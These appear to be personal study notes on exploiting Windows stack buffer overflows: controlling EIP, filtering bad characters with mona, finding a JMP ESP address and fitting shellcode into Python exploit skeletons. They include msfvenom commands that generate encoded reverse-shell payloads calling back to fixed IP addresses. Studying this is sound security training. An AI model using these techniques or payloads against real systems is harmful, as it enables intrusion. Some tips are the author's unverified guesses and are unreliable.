## Buffer Overflow

The way the overflow occurs may vary, but generally speaking, once you found the overflow, the steps are the same to exploit it.

### 1. Control EIP

Figure out exactly which part of the buffer is landing in the EIP.  Two methods:

1. Use Metasploit's pattern creation tool in Kali
   `msf-pattern_create -l LENGTH`
   *Note:  If your ESP unexpectedly jumps to another spot in the stack before your input buffer, make sure the overflow isn't too long.  Try to reduce the size of it while still triggering it.*
2. EIP will report the value as the hexadecimal representation of the string of characters
3. Use msf-pattern again to find that subset in your main string, it will return how many characters your filler needs to be before the EIP:
   `msf-pattern_offset -l LENGTH -q HEX#_FROM_EIP`

```python
# Pattern Example:
"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba"
```

```python
# Exhibiting EIP control Example:
    filler = "A" * 780
    eip  = "B" * 4
    ending = "C" * 16
    inputBuffer = filler + eip + ending
```

### 2. Discover Bad Characters

1. Insert the full hex character set into the code somewhere after the EIP (if this is not possible, you'll have to blindly test it by inserting it before EIP line by line, then character by character and hope for a crash) and then run the code.

   ```python
   # Common bad characters:  0x00 (NULL)
   # Bad for HTTP:  0x0A (Line Feed), 0x0D (End Character), 0x25 (%), 0x26 (&), 0x2B (+), 0x3D (=)
   badchars = (
       "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
       "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
       "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
       "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
       "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
       "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
       "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
       "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
       "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
       "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
       "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
       "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
       "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
       "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
       "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
       "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )
   ```

2. You may manually check for bad characters by right clicking ESP and 'Follow in stack' then look at where/if the bad characters stopped, but if it simply omits the characters and continues on, it's easy to miss and is better to use mona, as shown below.

   1. In Immunity, set the location of the working folder

      ```bash
      !mona config -set workingfolder c:\tools\
      ```

   2. Generate the same character set in a bin file to compare with:

      ```bash
      # Double-check this next time you try it by examining the bin file, I'm not sure if the .. is right at the end
      !mona bytearray -cpb "\x00"
      
      ```
   

!mona bytearray -cpb "\x00\x81..\xff"
      ```

   3. Find where the bad characters start in the stack for the address to compare the received characters with the expected ones:
   
      ```bash
!mona compare -f c:\tools\bytearray.bin -a 03aef764
      ```
   
   4. Update the bin file to exclude any characters found to be bad
   
      ```bash
      # This will exclude x00
      !mona bytearray -cpb "\x00"
      # This will exclude the specified characters but include the items between them.  The .. is used to specify the range should be excluded.
      !mona bytearray -cpb "\x00\x20..\xff"
      !mona bytearray -cpb "\x00..\x1f\x40..\xff"
      ```
   
   5. You can use the generated bin file or manually modify the code to remove the bad characters (be sure to note them in the code), then re-run the code and repeat this process until all the remaining characters show up.

### 3. Add EIP/ESP Offset

Look to see where ESP is pointing to at crash time and compare it to where EIP points.  Add enough characters to the input to fill in any space that may exist between the two such that your shellcode falls exactly where ESP points.  

```python
# Defining space between EIP and ESP
	filler = "A" * 780
    eip  = "B" * 4
    offset = "C" * 4	# Distance from EIP to ESP
    end = "D" * 20
    inputBuffer = filler + eip + offset + end
```

### 4. Redirecting Execution Flow

1. If using the ESP register to point to shellcode, you must locate a `JMP ESP` instruction in a library in memory using mona in Immunity:

   ```bash
   !mona modules
   ```

   It must meet these criteria:

   - The addresses used in the library must not use ASLR
   - The address must not contain any of the bad characters that will break the exploit.

2. Once a DLL is identified, use mona to search for the hex representation of `JMP ESP`

   ```bash
   # Ex:
   !mona find -s "\xff\xe4" -m "libspp.dll"
   ```

3. If a result is found, you can highlight it and hit Enter to go to that address in the disassembler or use the "Go to address in disassembler" button ![image-20200704164547700](.BufferOverflow.assets/image-20200704164547700.png) and enter the address it found.  Here you can verify it does indeed contain the instruction JMP ESP.
   *Hint:  Set a breakpoint here (F2) for troubleshooting!*

4. In the exploit code, set the EIP value to this address with the hex digits IN REVERSE (due to Intel's 'little endian' architecture).  So if the address is 0x10090c83, then the value of EIP should be: `\x83\x0c\x09\x10`, with escape characters included.
   **Hint: You can use struct to auto-convert this to little endian for better readability**

   ```python
   import struct
       ptr_jmp_esp = 0x1480113D
       eip = struct.pack("<I", ptr_jmp_esp)
   ```

5. Once executed, EIP will be set to the ESP value, which will cause EIP to execute our shellcode, once we have it in place.

### 5. Generate Shellcode

```bash
# Example this creates a reverse netcat-like shell
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.216 LPORT=8000 EXITFUNC=thread -f python -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d" -v VARIABLE

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.19.21 LPORT=8000 EXITFUNC=thread -f python -e x86/shikata_ga_nai -b "\x00\x04\x05\x11\x12\x40\x41\x78\x79\xa2\xa3" -v VARIABLE

EXITFUNC=thread # Tells the exploit to terminate the thread and not the whole process
```

#### Too Many Bad Chars

Try another encoder like `x86/xor_dynamic` or `cmd/powershell_base64` for Windows

##### EXITFUNC

The default exit for shellcode generated with MSFVenom is ExitProcess, which terminates the entire process when the reverse shell is terminated.  For threaded applications, you can try to use ExitThread instead to terminate the single thread without killing the whole application.  This is the purpose of the `EXITFUNC=thread ` parameter with MSF Venom.

### 6. Locate Shellcode Space

1. msfvenom tells how much space it uses, but shellcode usually requires approximately 350-400 bytes of space.

2. Create buffer space for the code at the end of the input buffer to create space for the shellcode to make sure you can fit it.

   ```python
   # Testing buffer space
   	filler = "A" * 780
       eip  = "B" * 4
       offset = "C" * 4	# Distance from EIP to ESP
       codebuffer = "D" * (1500 -len(filler) - len(eip) - len(offset))
       inputBuffer = filler + eip + offset + codebuffer
   ```

3. If you have limited room at the end of your input buffer, you can try one of these things to insert the shellcode elsewhere:

   1. Move ESP using the `sub esp,0xXX` command.  You can translate this to opcode using Metasploit.
      
      - **WARNING 1:  Make sure to move ESP in amounts divisible by 4 (in decimal) or it won't work!**  I think it messes with the other registers.
      
      - **WARNING 2:  This cannot contain bad characters, which limits you to a max amount of 0x7C per move (I think).  Anything I tried above that added `x00` to the end of it, which is a common bad character**
      
      - HINT:  You can double-click a stack address to show the offset of all the addresses around it to make it WAY easier to calculate how much to subtract.
      
        ```bash
        /usr/share/metasploit-framework/tools/exploit/metasm_shell.rb
        # Remember to count by decimal 4's!!
        sub esp,0x10	# Good!
        sub esp,0x11	# BAD!! NOT MULTIPLE OF 4!!
        # Anything above 0x7c adds x00 to the end
        # Outputs "\x83\xec\x10"
        
        sub esp,0x7c	# "\x83\xec\x7c"
        ```

      2. Use JMP to another register if you find that it points to your input buffer. 
      
         - One example I found had the ECX register pointing to the beginning of the input buffer, BUT it was using the stack address, it was using the assembly instruction address, so you'll need to search for it there to see what the register is pointing to.

4. Insert shellcode into created space.

### Troubleshooting

#### Exception Error with Shellcode

If you are getting an exception error, try one of these:

- NOP Sleds
- An encoder process is stubbed at the beginning of any encoded shell code and is run to decode the shellcode in memory.  The GetPC part of this process moves the value of the EIP register into another register which writes to the top of the stack and mangles some of the bytes pointed to by the ESP register, which overwrites our return address and causes an access violation.
  - Two solutions:
    1. Adjust ESP backwards before executing the decoder (little complicated)
    2. Create a NOP sled to increase the size of the landing pad (easy).  NOP commands just bump it to the next command, so overwriting one doesn't harm the program.  NOP has a hex opcode of 0x90.  The magic number of NOPs to pad is 12-10.
  
- No Debugger
- I had one BOF that wouldn't work while I had it open in the debugger, so try it without it to see if it works.

#### Random ESP Value

If your ESP jumps to a random spot before your input buffer, make sure the input wasn't longer than the memory space.  Try reducing the size of the input while still triggering the overflow.
